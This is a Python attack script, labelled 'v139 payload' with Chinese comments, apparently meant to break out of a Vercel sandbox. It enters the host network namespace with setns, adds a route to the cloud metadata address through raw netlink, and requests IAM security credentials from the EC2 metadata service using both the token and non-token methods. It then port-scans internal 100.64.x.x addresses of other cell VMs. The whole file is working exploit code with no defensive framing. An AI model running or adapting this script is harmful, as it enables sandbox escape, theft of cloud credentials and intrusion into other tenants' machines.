# -*- coding: utf-8 -*-
"""v139 payload: cell VM netns 确认 + netlink 加路由 -> IMDS 穿透 + 定向探测 100.64 网段
目标: EC2 IMDS / 其他 cell VM
输出 /vercel/sandbox/v139c.out"""
import socket, struct, time, json, os, signal, ctypes, urllib.request, subprocess

OUT = '/vercel/sandbox/v139c.out'
f = open(OUT, 'w', encoding='utf-8', errors='replace')
signal.alarm(240)


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    try:
        f.write(line + '\n')
        f.flush()
    except Exception:
        pass
    print(line, flush=True)


def rd(p, n=4000):
    try:
        return open(p, 'rb').read(n)
    except Exception as e:
        return 'EXC %s' % str(e).encode()


def http_req(url, method='GET', headers=None, timeout=4):
    try:
        req = urllib.request.Request(url, method=method, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout) as r:
            return r.status, r.read(5000)
    except Exception as e:
        return 'EXC %s' % type(e).__name__, str(e).encode()


def tcp_conn(ip, port, t=2):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(t)
        s.connect((ip, port))
        s.close()
        return 'OPEN'
    except Exception as e:
        return 'CLOSED %s' % type(e).__name__


# 1: setns celld netns
log('=== 1 setns ===')
try:
    libc = ctypes.CDLL(None, use_errno=True)
    fd = os.open('/proc/1/ns/net', os.O_RDONLY)
    r = libc.setns(ctypes.c_int(fd), ctypes.c_int(0))
    log('setns rc=%d errno=%d' % (r, ctypes.get_errno()))
    # 读本机 IP（fib_trie）
    trie = rd('/proc/net/fib_trie', 4000).decode(errors='replace')
    log('fib_trie:\n' + trie[:2500])
except Exception as e:
    log('setns EXC %s' % e)

# 2: 加路由 169.254.169.254/32
log('=== 2 add route ===')
def add_route(dst, gw):
    # netlink RTM_NEWROUTE
    try:
        NLMSG_ERROR = 0x2
        RTM_NEWROUTE = 24
        NLM_F_REQUEST = 0x1
        NLM_F_ACK = 0x4
        NLM_F_CREATE = 0x400
        NLM_F_EXCL = 0x200
        RTA_DST = 1
        RTA_GATEWAY = 5
        RTA_OIF = 4
        AF_INET = 2
        RT_SCOPE_UNIVERSE = 0
        RT_TABLE_MAIN = 254
        RTN_UNICAST = 1
        IPPROTO = socket.IPPROTO_RAW

        def in4(s):
            return socket.inet_aton(s)

        rt = struct.pack('BBBBHHHBBBB', AF_INET, 8, 0, 0,
                         RT_TABLE_MAIN, 0, 0, 0, 0, 0)
        # rtmsg: family, dst_len, src_len, tos, table, protocol, scope, type, flags
        # struct rtmsg { unsigned char rtm_family; unsigned char rtm_dst_len; unsigned char rtm_src_len; unsigned char rtm_tos; unsigned char rtm_table; unsigned char rtm_protocol; unsigned char rtm_scope; unsigned char rtm_type; unsigned rtm_flags; }
        body = struct.pack('BBBBBBBB', AF_INET, 32, 0, 0, RT_TABLE_MAIN, 3, RT_SCOPE_UNIVERSE, RTN_UNICAST)
        body += struct.pack('I', 0)
        attrs = b''
        attrs += struct.pack('HHI', 1, 8, 0) + in4(dst)          # RTA_DST
        attrs += struct.pack('HHI', 5, 8, 0) + in4(gw)           # RTA_GATEWAY
        body += attrs
        nlh = struct.pack('IHHII', 16 + len(body), RTM_NEWROUTE, NLM_F_REQUEST | NLM_F_ACK | NLM_F_CREATE | NLM_F_EXCL, 1, 0)
        s = socket.socket(socket.AF_NETLINK, socket.SOCK_RAW, 0)
        s.send(nlh + body)
        data = s.recv(4096)
        s.close()
        # 解析 NLMSG_ERROR
        err = struct.unpack('i', data[16:20])[0]
        return 'ack errno=%d' % err
    except Exception as e:
        return 'EXC %s' % str(e)

log('add route: %s' % add_route('169.254.169.254', '100.64.0.1'))
time.sleep(0.5)
log('route table:\n' + rd('/proc/net/route', 1500).decode(errors='replace'))

# 3: IMDS
log('=== 3 IMDS ===')
for url in ['http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/meta-data/instance-id',
            'http://169.254.169.254/latest/meta-data/iam/security-credentials/']:
    st, body = http_req(url, timeout=4)
    log('IMDS1 %s -> %s %r' % (url.split('/latest')[-1], st, body[:500]))
st, body = http_req('http://169.254.169.254/latest/api/token', method='PUT',
                    headers={'X-aws-ec2-metadata-token-ttl-seconds': '21600'}, timeout=4)
log('IMDS2 PUT -> %s %r' % (st, body[:200]))
if st == 200:
    tok = body.decode().strip()
    for url in ['http://169.254.169.254/latest/meta-data/',
                'http://169.254.169.254/latest/meta-data/iam/security-credentials/']:
        st, body = http_req(url, headers={'X-aws-ec2-metadata-token': tok}, timeout=4)
        log('IMDS2 %s -> %s %r' % (url.split('/latest')[-1], st, body[:500]))

# 4: 定向探测 100.64 网段
log('=== 4 probe ===')
targets = [
    ('100.64.0.1', 23456), ('100.64.0.1', 80), ('100.64.0.1', 443), ('100.64.0.1', 8080),
    ('100.64.176.1', 23456), ('100.64.176.1', 80), ('100.64.176.1', 443),
    ('100.64.176.12', 23456), ('100.64.176.12', 80), ('100.64.176.12', 443), ('100.64.176.12', 22),
    ('100.64.0.2', 23456), ('100.64.0.3', 23456), ('100.64.1.1', 23456), ('100.64.2.1', 23456),
    ('172.31.0.2', 53), ('100.64.0.1', 53),
]
for ip, port in targets:
    res = tcp_conn(ip, port, t=1.5)
    if 'OPEN' in res:
        log('PROBE %s:%d -> %s' % (ip, port, res))
    else:
        log('PROBE %s:%d -> %s' % (ip, port, res))

log('V139_DONE')
f.close()
